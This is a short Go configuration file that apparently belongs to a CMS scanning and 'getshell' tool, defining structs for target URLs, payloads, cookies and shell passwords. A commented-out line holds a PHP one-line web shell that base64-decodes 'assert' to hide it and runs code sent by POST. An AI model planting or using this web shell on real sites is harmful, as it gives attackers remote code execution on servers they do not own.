package config

type Info struct {
	Url string
	Cms string
	ScanUrl         []string
	Payload string
	Request_Type string
	Cookie string
	Response string
	Getshell_Type string
	ShellPassword string
	Result string
}

type Result struct {
	StatusCode int
	Body string
}


//var Payload = map[string]string{
//	"get_payload": string("$ant=base64_decode(YXNzZXJ0);$ant($_POST[amips]);"),
//}